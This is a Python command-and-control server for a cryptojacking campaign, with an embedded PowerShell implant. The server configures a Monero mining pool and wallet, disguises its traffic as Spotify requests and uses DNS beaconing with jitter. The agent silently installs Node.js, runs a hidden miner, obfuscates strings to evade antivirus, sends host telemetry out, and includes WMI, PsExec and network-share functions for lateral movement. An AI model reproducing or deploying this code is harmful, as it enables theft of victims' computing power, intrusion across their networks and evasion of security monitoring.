import asyncio
import os
import base64
import threading
import random
import re
import time
import aiohttp
from aiohttp import web
from datetime import datetime, UTC, timedelta
from cryptography.fernet import Fernet
import pymongo
from src import ConfLoad, Banner
import traceback
import json
import hashlib
import ssl

# For programmatic certificate generation
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# --- Global Variables & Configuration (Moved to top for scope) ---
# Crash Log File (Defined early for global availability)
CRASH_LOG_FILE = "c2_crash_log.txt"

# TLS/HTTPS Configuration (Defined early for global availability)
CERT_FILE = "server.pem"
KEY_FILE = "server.key"

# --- Utility Functions (Defined early for global availability) ---

def log_event(event_type, message, ip=None, agent_id=None):
    """Logs an event to console and MongoDB for persistent record-keeping."""
    timestamp = datetime.now(UTC).strftime('%Y-%m-%d %H:%M:%S UTC')
    print(f"[{event_type.upper()}] {timestamp} - {message} (IP: {ip or 'N/A'}, Agent: {agent_id or 'N/A'})")
    try:
        # FIX: Changed 'if logs_collection:' to 'if logs_collection is not None:'
        if 'logs_collection' in globals() and logs_collection is not None:
            logs_collection.insert_one({
                'event_type': event_type,
                'message': message,
                'ip': ip or 'N/A',
                'agent_id': agent_id or 'N/A',
                'timestamp': datetime.now(UTC)
            })
    except Exception as e:
        print(f"[ERROR] Failed to log to MongoDB: {e}")


def log_crash(error, stack_trace):
    """Logs critical errors and their stack traces to a file and console."""
    try:
        with open(CRASH_LOG_FILE, 'a', encoding='utf-8') as f:
            timestamp = datetime.now(UTC).strftime('%Y-%m-%d %H:%M:%S UTC')
            f.write(f"[{timestamp}] CRITICAL ERROR: {str(error)}\n")
            f.write("Traceback:\n")
            f.write(stack_trace)
            f.write("\n" + "="*80 + "\n\n")
        print(f"[FATAL_ERROR] Crash log written to {CRASH_LOG_FILE}. Please check it for details.")
    except Exception as e:
        print(f"[CRITICAL_ERROR] Failed to write crash log: {e}. Original error: {e}")

# Loaded from src/ConfLoad.py.
# Explicitly ensure Host is never '0.0.0.0'. If ConfLoad returns 0.0.0.0,
# we force it to 127.0.0.1. This means the server will only listen on localhost
# by default. For external access, you would need to configure `Host` to a specific
# public IP address or rely on network forwarding/NAT.
_loaded_host, Port, MongoURI, MinerConfig = ConfLoad.LoadConfigFile() # Using the original Port name
Host = _loaded_host # Keep it as loaded, don't force 127.0.0.1 here if 0.0.0.0
Banner.PrintBanerRc()

# MongoDB setup (Needs to be after MongoURI is loaded)
client = pymongo.MongoClient(MongoURI)
db = client['c2_database']
agents_collection = db['agents']
tasks_collection = db['tasks']
logs_collection = db['logs']
playbooks_collection = db['playbooks'] # Collection for automated strategies

# Static Directory for Miner Files
STATIC_DIR = "static"
os.makedirs(STATIC_DIR, exist_ok=True)
MINER_JS_PATH = os.path.join(STATIC_DIR, "miner.js")
LAUNCHER_SOURCE_DIR = "launcher_source" # Directory to store C# launcher source code
os.makedirs(LAUNCHER_SOURCE_DIR, exist_ok=True)


def generate_self_signed_cert(cert_file, key_file, host):
    """Generates a self-signed SSL certificate and key."""
    log_event('info', f"Generating self-signed SSL certificate: {cert_file} and {key_file} for host {host}")
    try:
        # Generate private key
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )

        # Generate a self-signed certificate
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"Maryland"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, u"Potomac"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"C2 Ops"),
            x509.NameAttribute(NameOID.COMMON_NAME, host),
        ])
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.now(UTC)
        ).not_valid_after(
            datetime.now(UTC) + timedelta(days=365) # Valid for 1 year
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName(host)]),
            critical=False,
        ).sign(key, hashes.SHA256(), default_backend())

        # Write private key
        with open(key_file, "wb") as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))

        # Write certificate
        with open(cert_file, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        log_event('info', "Self-signed SSL certificate generated successfully.")
        return True
    except Exception as e:
        log_event('fatal_error', f"Failed to generate self-signed SSL certificate: {e}", agent_id="N/A")
        log_crash(e, traceback.format_exc())
        return False

# Compute the SHA256 hash of the public key from server.pem for certificate pinning
def get_cert_pubkey_hash(cert_file):
    """
    Computes the SHA256 hash of the public key from a PEM certificate file.
    This hash is used for certificate pinning in agents.
    """
    try:
        from cryptography import x509
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import hashes
        # Correct import for Encoding and PublicFormat
        from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
        
        with open(cert_file, "rb") as f:
            cert_data = f.read()
        cert = x509.load_pem_x509_certificate(cert_data, default_backend())
        # Get the public key in DER format and then hash it
        public_key_der = cert.public_key().public_bytes(
            encoding=Encoding.DER, # Use imported Encoding
            format=PublicFormat.SubjectPublicKeyInfo # Use imported PublicFormat
        )
        return hashlib.sha256(public_key_der).hexdigest()
    except ImportError:
        log_event('warning', "cryptography library not found (or partial). Certificate pinning might be affected.", agent_id="N/A")
        return None
    except Exception as e:
        log_event('error', f"Failed to get certificate public key hash: {e}", agent_id="N/A")
        log_crash(e, traceback.format_exc())
        return None

# Global variable for the certificate public key hash
CERT_PUBKEY_HASH = None


# Core C2 Automation Configuration
CONFIG = {
    "ATTACKER_IP": Host, # Now uses value from ConfLoad.py
    "ATTACKER_PORT": Port, # Now uses value from ConfLoad.py
    "MINER_POOL_URL": "wss://gulf.moneroocean.stream:10128", # Updated pool and port
    "MINER_WALLET_ADDRESS": "4ADkuMYr8qrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZi4QwBjop9", # Example wallet
    "ACTIVE_HOURS_START": 8,  # 8 AM UTC - Default for playbooks
    "ACTIVE_HOURS_END": 18,   # 6 PM UTC - Default for playbooks
    "TELEMETRY_INTERVAL": 300,  # 5 minutes in seconds: how often C2 requests telemetry
    "HEALTH_CHECK_INTERVAL": 60,  # 1 minute in seconds: how often C2 checks its components
    "MINER_REDEPLOY_GRACE_PERIOD": 120, # Seconds: cooldown after unexpected miner stop before redeploying
    "DEFAULT_MINER_INTENSITY": 0.2, # Default mining intensity (0.0 to 1.0)
    "MAX_CPU_THRESHOLD_FOR_MINING": 70, # Max CPU % before C2 signals intensity reduction
    "MIN_CPU_THRESHOLD_FOR_MINING": 30, # Min CPU % to allow C2 to signal intensity increase
    "IDLE_MINING_INTENSITY_FACTOR": 0.005, # Factor for calculating intensity based on available CPU %
    "DEFAULT_MINER_PROCESS_NAME": "node", # Default process name for the miner
    "DNS_BEACON_DOMAIN": "beacon.example.com", # Domain for DNS TXT beaconing
    "DNS_BEACON_INTERVAL": 3600, # 1 hour in seconds: how often to send DNS beacon
    "BASE_BEACON_INTERVAL": 10,  # Base polling interval for agents (seconds)
    "BEACON_JITTER_PERCENT": 0.5, # Jitter as a percentage (e.g., 0.5 means +/- 50% of base interval)
    "MAX_HTTP_BEACON_INTERVAL": 600, # Max HTTP beacon interval in seconds (e.g., 10 minutes)
    "MAX_DNS_BEACON_INTERVAL": 7200, # Max DNS beacon interval in seconds (e.g., 2 hours)
    "PAYLOAD_CHUNK_SIZE": 4096, # Bytes: Size of payload chunks for staged delivery
    "MINERS_PER_MINUTE": 100,
    "MINIMUM_MINERS": 50,
    "INSTRUCTION_EXPIRATION": 10800,  # 3 hours in seconds
    "MINER_INSTRUCTION_COOLDOWN": 300, # 5 minutes cooldown for bulk miner instructions
    "INITIAL_SETUP_COOLDOWN": 60, # 1 minute cooldown for initial powershell_delivery/stealth_setup tasks
    "C2_PROFILE": { # Malleable C2 Profile
        # Example: Mimic Spotify traffic
        "REGISTER": {"path": "/api/v2/auth/login/{agent_id}", "method": "GET", "content_type": "application/json"},
        "TASK": {"path": "/api/v3/updates/check/{agent_id}", "method": "GET", "content_type": "application/json"},
        "RESULTS": {"path": "/api/v4/data/submit/{agent_id}", "method": "POST", "content_type": "application/json"},
        "TELEMETRY": {"path": "/api/v1/metrics/upload/{agent_id}", "method": "POST", "content_type": "application/json"},
        "MINER_JS": {"path": "/cdn/assets/app.js", "method": "GET", "content_type": "application/javascript"},
        "WEBSOCKET": {"path": "/wsCeaf37e4/live", "method": "GET"},
        # New endpoint for staged payload delivery
        "STAGED_PAYLOAD": {"path": "/data/payload/{agent_id}/{chunk_id}", "method": "GET", "content_type": "application/octet-stream"},
        # You can expand with more options like custom headers, dummy data, etc.
        # "HEADERS": {"User-Agent": "Spotify/1.1.80.380 (Windows 10;)", "Accept": "application/json"}
    }
}

def get_c2_path(endpoint_type, agent_id=None, chunk_id=None):
    """
    Constructs a C2 URL path based on the defined C2_PROFILE.
    """
    profile = CONFIG["C2_PROFILE"].get(endpoint_type.upper())
    if not profile:
        raise ValueError(f"Unknown C2 endpoint type: {endpoint_type}")
    
    path = profile["path"]
    
    # Create a dictionary of arguments to pass to format
    format_args = {}
    if agent_id:
        format_args['agent_id'] = agent_id
    if chunk_id is not None: # chunk_id can be 0, so check for None
        format_args['chunk_id'] = chunk_id
            
    # Format the path using all collected arguments
    path = path.format(**format_args)
    
    return path

# Store full agent payloads (encrypted) for chunked delivery
agent_payload_cache = {}

# Keep track of last bulk instruction time
# This will be initialized in main_server_loop to ensure proper state on startup
last_bulk_instruction_time = datetime.min.replace(tzinfo=UTC)
last_initial_setup_time = datetime.min.replace(tzinfo=UTC) # New cooldown for initial setup tasks

# --- Agent Management Functions (Database Interactions) ---

async def register_agent_db(agent_id, ip, aes_key_bytes, agent_ip=None):
    """Registers or updates an agent's information in the database.
    Sets initial playbook, telemetry defaults, and ensures readiness for tasking."""
    agents_collection.update_one(
        {'agent_id': agent_id},
        {'$set': {
            'ip_address': agent_ip if agent_ip else ip, # Use agent_ip if provided, else request.remote
            'aes_key': aes_key_bytes.decode(),
            'status': 'active',
            'miner_status': 'stopped', # Default status
            'last_checkin': datetime.now(UTC),
            'playbook_id': 1, # Default playbook: Stealth Mining
            'telemetry': {'status': 'stopped', 'cpu': 0, 'mem': 100, 'hash_rate': 0, 'security_events': []},
            'last_telemetry': datetime.now(UTC) - timedelta(seconds=CONFIG["TELEMETRY_INTERVAL"] + 10), # Force immediate telemetry on register
            'obfuscation_hash': hashlib.sha256(os.urandom(16)).hexdigest()[:8], # Initial random hash for miner.js
            'current_process_name': CONFIG["DEFAULT_MINER_PROCESS_NAME"], # Store current process name for cloaking
            'last_miner_stop_time': None, # To track unexpected stops for redeployment logic
            'timezone_offset': 0, # Will be updated by agent telemetry
            'last_dns_beacon': datetime.now(UTC) - timedelta(seconds=CONFIG["DNS_BEACON_INTERVAL"] + 60), # Force immediate DNS beacon on register
            'base_beacon_interval': CONFIG["BASE_BEACON_INTERVAL"], # Default base beacon interval
            'beacon_jitter_percent': CONFIG["BEACON_JITTER_PERCENT"], # Default beacon jitter
            'instruction_expiration': None,
            'is_following_instructions': False,
            'is_initial_setup_done': False # New field to track if initial setup tasks have been assigned
        }},
        upsert=True
    )
    log_event('registration', f"Agent {agent_id} registered/updated", ip=agent_ip if agent_ip else ip, agent_id=agent_id)
    # IMPORTANT: Removed immediate task assignment on registration to prevent flooding.
    # Initial tasks will now be handled by schedule_tasks automation loop or manual intervention.

async def assign_task_db(agent_id, command, priority=5):
    """Assigns a task to an agent in the database with a given priority."""
    tasks_collection.insert_one({
        'agent_id': agent_id,
        'command': command,
        'status': 'pending',
        'priority': priority, # Higher number = higher priority
        'submission_time': datetime.now(UTC)
    })
    log_event('task_assigned', f"Task '{command}' assigned to agent {agent_id} (P:{priority})", agent_id=agent_id)

# --- Polymorphic Agent & Miner Generation ---

# Base PowerShell Agent Template
# This script contains the logic for the agent to communicate with the C2,\
# gather telemetry, and execute tasks like starting/stopping mining or arbitrary commands.
VENOM_POWERSHELL_AGENT_SCRIPT = r"""
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $bytess = $bytes.length
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytess);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV 
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16); 
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

# New functions for In-Memory String Obfuscation
# Simple XOR-based encryption/decryption for strings in memory
# Not cryptographically secure, but simple evasion against signature scans
function Encrypt-InMemoryString($stringToEncrypt, $xorKey) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($stringToEncrypt)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($xorKey)
    $encryptedBytes = New-Object byte[] ($bytes.Length)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $encryptedBytes[$i] = $bytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return [System.Convert]::ToBase64String($encryptedBytes)
}

function Decrypt-InMemoryString($encryptedString, $xorKey) {
    $bytes = [System.Convert]::FromBase64String($encryptedString)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($xorKey)
    $decryptedBytes = New-Object byte[] ($bytes.Length)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $decryptedBytes[$i] = $bytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

function Check-NodeJsInstalled {
    try {
        $nodeVersion = & node -v 2>$null
        if ($nodeVersion) {
            return $true
        }
    } catch {
        return $false
    }
    return $false
}

function Install-NodeJsStealthily {
    try {
        $installerUrl = "https://nodejs.org/dist/v16.13.0/node-v16.13.0-x64.msi"
        $installerPath = "$env:TEMP\nodejs.msi"
        Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -UseBasicParsing
        Start-Process -FilePath "msiexec.exe" -ArgumentList "/i $installerPath /quiet /norestart" -Wait
        Remove-Item $installerPath -Force
        $result = "Node.js installed successfully"
        return $result
    } catch {
        $result = "Node.js installation failed: $($_.Exception.Message)"
        return $result
    }
}

function Test-PoolConnectivity {
    param (
        [string]$PoolUrl = "CURRENT_MINER_POOL_URL"
    )
    try {
        $response = Invoke-WebRequest -Uri $PoolUrl -Method 'GET' -TimeoutSec 10 -UseBasicParsing
        if ($response.StatusCode -eq 200) {
            return "Pool connectivity successful"
        } else {
            return "Pool connectivity failed with status code: $($response.StatusCode)"
        }
    } catch {
        return "Pool connectivity failed: $($_.Exception.Message)"
    }
}

function Start-Mining {
    param (
        [string]$MinerJsPath = "$env:TEMP\miner.js",
        [string]$Intensity = "0.5"
    )
    try {
        if (-not (Test-Path $MinerJsPath)) {
            throw "Miner script not found at $MinerJsPath"
        }
        $miner_name = Decrypt-InMemoryString $encryptedMinerName $InMemoryXorKey
        $process = Start-Process -FilePath "node" -ArgumentList $MinerJsPath -NoNewWindow -PassThru
        return "Mining started successfully with PID: $($process.Id), process name (intended): $miner_name"
    } catch {
        $errorDetails = @{
            error = $_.Exception.Message
            stacktrace = $_.ScriptStackTrace
            timestamp = (Get-Date -UFormat "%s")
        } | ConvertTo-Json
        Invoke-WebRequestWithPinning -Uri $responseuri -Method "POST" -Body $errorDetails -ContentType "application/json" -ErrorAction SilentlyContinue
        return "Mining failed: $($_.Exception.Message)"
    }
}

function Get-Telemetry {
    # Get CPU Load
    $cpu = (Get-WmiObject Win32_Processor).LoadPercentage
    # Get Free Memory Percentage
    $mem = [math]::Round(((Get-WmiObject Win32_OperatingSystem).FreePhysicalMemory / (Get-WmiObject Win32_OperatingSystem).TotalVisibleMemorySize) * 100, 2)
    
    # Check miner process by name (configured by C2 or default "node.exe")
    # CURRENT_MINER_PROCESS_NAME is a placeholder replaced by the server.
    $minerProc = Get-Process -Name (Decrypt-InMemoryString $encryptedMinerName $InMemoryXorKey) -ErrorAction SilentlyContinue
    $status = if ($minerProc) { "running" } else { "stopped" }
    
    # Simulate Hash Rate (real miner would report this)
    $hashRate = if ($minerProc) { (Get-Random -Minimum 100 -Maximum 500) } else { 0 } # Hashes/sec example
    
    # Get recent security-related events (e.g., AV alerts, service stops)
    # This is a basic example; real-world would involve more specific event IDs
    $systemEvents = Get-WinEvent -FilterHashtable @{LogName='System'; Level=2,3} -MaxEvents 5 -ErrorAction SilentlyContinue | Select-Object -Property TimeCreated,Id,LevelDisplayName,Message
    $securityEvents = $systemEvents | ConvertTo-Json -Compress
    
    # Get local time zone offset for scheduling
    $tzOffset = ([System.TimeZoneInfo]::Local.GetUtcOffset([System.DateTime]::Now).TotalHours)
    
    # Get agent's local IP address, excluding loopback interfaces
    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress
    if ($ipAddress -is [System.Array]) {
        $ipAddress = $ipAddress[0] # Take the first non-loopback IP if multiple exist
    }
    if (-not $ipAddress) {
        $ipAddress = "0.0.0.0" # Fallback if no valid IP found
    }

    $telemetry = @{
        cpu_usage = $cpu
        memory_total = (Get-WmiObject Win32_OperatingSystem).TotalVisibleMemorySize
        memory_free = $mem # Now free percent
        agent_ip = $ipAddress  # Add the agent's IP
        timestamp = (Get-Date -UFormat "%s")
        miner_status = $status
        hash_rate = $hashRate
        security_events = $securityEvents
        timezone_offset = $tzOffset
    }
    return $telemetry | ConvertTo-Json # Return JSON string
}

# Function to send data via DNS TXT beacon
function Send-DnsBeacon {
    param (
        [string]$AgentId,
        [string]$MessageType, # e.g., "checkin", "alert"
        [string]$Payload,     # Small data string, base64 encoded if needed
        [string]$BeaconDomain # Base domain for beaconing, e.g., "beacon.example.com"
    )
    
    try {
        # Construct the subdomain: agentid.message_type.payload_hash.beacon_domain
        # Max DNS label length is 63 chars, total FQDN 255. Keep payload small.
        # For simplicity, we'll hash the payload to keep size down and rely on
        # predefined message types to interpret.
        $payloadHash = ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Payload))).Replace('+', '-').Replace('/', '_').Replace('=', '')
        $subdomain = "$($AgentId.Substring(0, [System.Math]::Min(10, $AgentId.Length))).$($MessageType).$($payloadHash.Substring(0, [System.Math]::Min(20, $payloadHash.Length)))"
        $fqdn = "$subdomain.$BeaconDomain"

        # Perform a DNS TXT record query. The actual response doesn't matter,
        # only that the query hits the attacker-controlled DNS server.
        # Using -ErrorAction SilentlyContinue to avoid breaking the agent flow.
        Resolve-DnsName -Name $fqdn -Type TXT -ErrorAction SilentlyContinue | Out-Null
        Write-Host "DNS Beacon sent: $fqdn"
        return "DNS Beacon sent: $fqdn"
    }
    catch {
        Write-Host "Failed to send DNS beacon: $($_.Exception.Message)"
        return "Failed to send DNS beacon: $($_.Exception.Message)"
    }
}


$ip = "ATTACKER_IP"
$port = "ATTACKER_PORT"
$id = "_AGENT_ID_PLACEHOLDER_" 
$key = "_AES_KEY_PLACEHOLDER_" 
$scheme = "https" # C2 server now runs on HTTPS
$certPubKeyHash = "CERT_PUBKEY_HASH" # SHA256 hash of the public key for pinning
$dnsBeaconDomain = "DNS_BEACON_DOMAIN" # DNS beacon domain from CONFIG
$baseBeaconInterval = BASE_BEACON_INTERVAL # Base polling interval from CONFIG
$beaconJitterPercent = BEACON_JITTER_PERCENT # Jitter percentage from CONFIG
$maxHttpBeaconInterval = MAX_HTTP_BEACON_INTERVAL # Max HTTP beacon interval from CONFIG
$maxDnsBeaconInterval = MAX_DNS_BEACON_INTERVAL # Max DNS beacon interval from CONFIG

# C2 Profile Paths - These will be replaced by the server
$regPath = "C2_REGISTER_PATH"
$taskPath = "C2_TASK_PATH"
$resultsPath = "C2_RESULTS_PATH"
$telemetryPath = "C2_TELEMETRY_PATH"
$minerJsPath = "C2_MINER_JS_PATH" # Path to the base64 encoded miner.js

$reguri = ($scheme + '://' + $ip + ':' + $port + $regPath)
$taskuri = ($scheme + '://' + $ip + ':' + $port + $taskPath)
$responseuri = ($scheme + '://' + $ip + ':' + $port + $resultsPath)
$telemetryuri = ($scheme + '://' + $ip + ':' + $port + $telemetryPath)
$minerJsDownloadUri = ($scheme + '://' + $ip + ':' + $port + $minerJsPath)


# Global variables for egress configuration
$globalProxy = $null
$globalUserAgent = $null

# Function to handle Invoke-WebRequest with certificate pinning
function Invoke-WebRequestWithPinning {
    param (
        [string]$Uri,
        [string]$Method = 'GET',
        [string]$Body = $null,
        [string]$ContentType = $null,
        [switch]$UseBasicParsing = $true,
        [switch]$ErrorActionStop = false,
        [string]$Proxy = $null,
        [hashtable]$Headers = $null
    )

    $params = @{
        Uri = $Uri
        Method = $Method
        UseBasicParsing = $UseBasicParsing
    }
    if ($Body) { $params.Body = $Body }
    if ($ContentType) { $params.ContentType = $ContentType }
    if ($Proxy) { $params.Proxy = $Proxy }
    if ($Headers) { $params.Headers = $Headers }
    if ($ErrorActionStop) { $params.ErrorAction = 'Stop' } else { $params.ErrorAction = 'SilentlyContinue' }

    # Custom validation for certificate pinning
    $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
        param($sender, $certificate, $chain, $sslPolicyErrors)
        
        # If no certificate pinning hash is provided, proceed without pinning
        if (-not $script:certPubKeyHash -or $script:certPubKeyHash -eq "") {
            return $true
        }

        # Calculate the SHA256 hash of the presented public key
        $sha256 = New-Object System.Security.Cryptography.SHA256Managed
        # Using RawData to get the DER-encoded certificate directly from the X509Certificate object
        # Then, get the public key from this raw certificate data.
        # This is generally more robust for pinning specific certificate public keys.
        $certRawData = $certificate.GetRawCertData()
        $x509Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certRawData)
        $publicKey = $x509Cert.PublicKey.RawData
        
        $publicKeyHash = [System.BitConverter]::ToString($sha256.ComputeHash($publicKey)).Replace("-", "").ToLowerInvariant()
        
        # Compare with the pinned hash
        return ($publicKeyHash -eq $script:certPubKeyHash)
    }
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $callback

    try {
        $response = Invoke-WebRequest @params
        return $response
    } finally {
        # Reset the callback to avoid interfering with other requests (important!)
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
    }
}

# New functions for Lateral Movement
function Invoke-WMICmd {
    param(
        [string]$Target,
        [string]$Command
    )
    try {
        $result = (Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $Command -ComputerName $Target -ErrorAction Stop).ReturnValue
        if ($result -eq 0) {
            return "WMI command '$Command' executed successfully on $Target."
        } else {
            return "WMI command '$Command' failed on $Target with error code: $result."
        }
    } catch {
        return "Error executing WMI command on $Target: $($_.Exception.Message)"
    }
}

function Invoke-PsExecCmd {
    param(
        [string]$Target,
        [string]$Username,
        [string]$Password,
        [string]$Command
    )
    # This assumes PsExec.exe is already present on the agent or will be downloaded.
    # For a full implementation, you'd need to stage PsExec.exe first.
    $PsExecPath = "C:\Windows\Temp\PsExec.exe" # Example path, ideally dynamically dropped
    
    if (-not (Test-Path $PsExecPath)) {
        return "PsExec.exe not found at $PsExecPath. Please ensure it's staged."
    }

    try {
        $cmdArgs = "-accepteula \\\\$Target -u $Username -p `"$Password`" cmd.exe /c `"$Command`""
        $process = Start-Process -FilePath $PsExecPath -ArgumentList $cmdArgs -NoNewWindow -PassThru -RedirectStandardOutput -RedirectStandardError
        $process.WaitForExit(60000) | Out-Null # Wait up to 60 seconds
        $output = $process.StandardOutput.ReadToEnd()
        $errorOutput = $process.StandardError.ReadToEnd()
        
        if ($process.ExitCode -eq 0) {
            return "PsExec command '$Command' executed successfully on $Target. Output: $output"
        } else {
            return "PsExec command '$Command' failed on $Target with exit code $($process.ExitCode). Output: $output. Error: $errorOutput"
        }
    } catch {
        return "Error executing PsExec command on $Target: $($_.Exception.Message)"
    }
}

function Copy-ToNetworkShare {
    param(
        [string]$SourcePath, # Path to the file on the agent to copy (e.g., $PSScriptRoot\loader.hta)
        [string]$TargetPath  # UNC path to the network share (e.g., \\target_ip\share\payload.hta)
    )
    try {
        Copy-Item -Path $SourcePath -Destination $TargetPath -Force -ErrorAction Stop
        return "File '$SourcePath' copied successfully to network share '$TargetPath'."
    } catch {
        return "Error copying file to network share '$TargetPath': $($_.Exception.Message)"
    }
}

# Placeholder for API unhooking or direct syscall invocation.
# In a full-fledged agent, these would involve injecting native code or using more advanced .NET reflection
# to interact directly with kernel APIs, bypassing user-mode API hooks set by EDRs.
# Example: Using [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
# or direct P/Invoke calls to unhook ntdll.dll or kernel32.dll functions.
# function Unhook-Api($moduleName, $functionName) { /* ... complex implementation ... */ }
# function Invoke-DirectSyscall($syscallId, $args) { /* ... very complex and OS-version specific implementation ... */ }


try {
    # Initial registration call
    # The C2 (AbyssXAnalyzer) will send back the AES key for this agent.
    # The agent receives it and updates its $script:key variable.
    $telemetryDataForRegistration = Get-Telemetry | ConvertTo-Json # Get telemetry including IP for registration
    $response = Invoke-WebRequestWithPinning -Uri $reguri -Method 'GET' -Headers @{'X-Agent-Telemetry'=$telemetryDataForRegistration} -ErrorActionStop
    $receivedKey = $response.Content # This should be the Base64 encoded AES key from C2.

    # The C2 sends base64 encoded AES key directly, no ASCII conversion needed for the key.
    $script:key = $receivedKey # Assign the base64 encoded key directly.

} catch {
    # If registration fails, exit agent
    exit
}

if ($script:key -ne "") { # Check if AES key was successfully received
    # Define a static XOR key for in-memory string obfuscation for demonstration.
    # In a real scenario, this key should be dynamically generated per agent session,
    # or derived from environment specifics to prevent static signature.
    $InMemoryXorKey = "RANDOM_XOR_KEY_PLACEHOLDER" # This will be replaced by a random string during generation.

    # Encrypt sensitive strings at startup
    $encryptedMinerName = Encrypt-InMemoryString "CURRENT_MINER_PROCESS_NAME" $InMemoryXorKey
    $encryptedCmdExe = Encrypt-InMemoryString "cmd.exe" $InMemoryXorKey
    $encryptedPowershellExe = Encrypt-InMemoryString "powershell.exe" $InMemoryXorKey

    # Check for Node.js and install if not present
    $nodeCheckPath = "HKCU:\Software\Venom\$id"
    if (-not (Test-Path $nodeCheckPath)) {
        try {
            if (-not (Check-NodeJsInstalled)) {
                $installResult = Install-NodeJsStealthily
                $encryptedResult = Encrypt-String $script:key $installResult
                Invoke-WebRequestWithPinning -Uri $responseuri -Method "POST" -Body $encryptedResult -ContentType "application/json" -ErrorAction SilentlyContinue
            }
            New-Item -Path "HKCU:\Software\Venom" -Name $id -Force | Out-Null
        } catch {
            $errorDetails = @{
                error = $_.Exception.Message
                stacktrace = $_.ScriptStackTrace
                timestamp = (Get-Date -UFormat "%s")
            } | ConvertTo-Json
            Invoke-WebRequestWithPinning -Uri $responseuri -Method "POST" -Body $errorDetails -ContentType "application/json" -ErrorAction SilentlyContinue
        }
    }

    # Initialize last beacon times
    $lastHttpCheckin = (Get-Date).AddSeconds(-($maxHttpBeaconInterval + 1)) # Force immediate check-in
    $lastDnsBeacon = (Get-Date).AddSeconds(-($maxDnsBeaconInterval + 1)) # Force immediate DNS beacon

    for (;;) {
        # Calculate random sleep interval for HTTP polling
        # sleep = base * (1 +/- jitter_percent)
        $randomFactor = (Get-Random -Minimum (-$beaconJitterPercent) -Maximum $beaconJitterPercent)
        $actualBeaconInterval = $baseBeaconInterval * (1 + $randomFactor)
        
        # Ensure sleep interval is within reasonable bounds (e.g., not negative, not excessively long)
        $sleepInterval = [System.Math]::Round([System.Math]::Max(1, [System.Math]::Min($maxHttpBeaconInterval, $actualBeaconInterval)))
        
        # Always report telemetry first if it's time
        $telemetry = Get-Telemetry
        $encrypted_telemetry = Encrypt-String $script:key $telemetry # Use updated key
        
        # Try primary (HTTPS) communication first if interval met
        $httpSuccess = $false
        $currentTime = Get-Date

        if (($currentTime - $lastHttpCheckin).TotalSeconds -ge $baseBeaconInterval) { # Use base interval for HTTP polling check
            try {
                $telemetryRequestParams = @{
                    Uri = $telemetryuri
                    Body = $encrypted_telemetry
                    ContentType = "text/plain; charset=utf-8"
                    Method = 'POST'
                    ErrorActionStop = true
                    UseBasicParsing = true
                }
                if ($globalProxy) { $telemetryRequestParams.Proxy = $globalProxy }
                if ($globalUserAgent) { $telemetryRequestParams.Headers = @{'User-Agent'=$globalUserAgent} }

                Invoke-WebRequestWithPinning @telemetryRequestParams | Out-Null
